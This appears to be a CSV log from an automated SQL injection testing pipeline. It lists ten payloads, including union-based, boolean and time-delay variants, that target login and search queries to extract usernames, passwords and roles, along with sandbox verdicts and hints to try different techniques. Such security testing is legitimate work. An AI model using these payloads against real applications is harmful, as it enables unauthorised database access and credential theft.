query_id,seed_payload,payload,full_query,attack_category,template_context,failure_stage,failure_reason,codebert_score,mutation_count,hint
q00052,,"'; WAITFOR DELAY '0:0:10' UNION ALL SELECT username, password, role FROM staff_members--","SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:10' UNION ALL SELECT username, password, role FROM staff_members--' AND password = 'anything'",union_based,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00054,,' OR 1=1 AND EXISTS(SELECT * FROM orders WHERE user_id=1)/*,SELECT * FROM products WHERE name LIKE '%' OR 1=1 AND EXISTS(SELECT * FROM orders WHERE user_id=1)/*%',union_based,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00056,,"' AND (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM employees GROUP BY department)) --","SELECT * FROM products WHERE name LIKE '%' AND (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM employees GROUP BY department)) --%'",union_based,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00062,,"' OR (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM products GROUP BY price HAVING COUNT(*) > 1))","SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM products GROUP BY price HAVING COUNT(*) > 1))%'",union_based,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00096,,"'"" OR 1=1/*","SELECT * FROM users WHERE username = ''"" OR 1=1/*' AND password = 'anything'",blind_boolean,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00105,,OR 'admin' LIKE 'admin'; WAITFOR DELAY '0:0:5,SELECT * FROM users WHERE username = 'OR 'admin' LIKE 'admin'; WAITFOR DELAY '0:0:5' AND password = 'anything',blind_boolean,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00159,,'; WAITFOR DELAY '0:0:5' --,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '0:0:5' --%',blind_time,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00160,,' AND 1=1; IF (CHAR(87)||CHAR(116)||CHAR(81)||CHAR(115)||CHAR(78)||CHAR(101)||CHAR(116)) IN ('WTSN') BEGIN PRINT CHAR(88); END --,SELECT * FROM products WHERE name LIKE '%' AND 1=1; IF (CHAR(87)||CHAR(116)||CHAR(81)||CHAR(115)||CHAR(78)||CHAR(101)||CHAR(116)) IN ('WTSN') BEGIN PRINT CHAR(88); END --%',blind_time,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00164,,' AND 1=1;(SELECT CASE WHEN LENGTH(password)>5 THEN WAITFOR DELAY '0:0:10' ELSE 0 END FROM users WHERE username='admin')--,SELECT * FROM products WHERE name LIKE '%' AND 1=1;(SELECT CASE WHEN LENGTH(password)>5 THEN WAITFOR DELAY '0:0:10' ELSE 0 END FROM users WHERE username='admin')--%',blind_time,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00166,,"' AND 1=1; (SELECT (CASE WHEN (SELECT GROUP_CONCAT(username SEPARATOR ',') FROM users) LIKE '%admin%' THEN BENCHMARK(500000,'x'=NULL) ELSE 0 END) --","SELECT * FROM products WHERE name LIKE '%' AND 1=1; (SELECT (CASE WHEN (SELECT GROUP_CONCAT(username SEPARATOR ',') FROM users) LIKE '%admin%' THEN BENCHMARK(500000,'x'=NULL) ELSE 0 END) --%'",blind_time,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
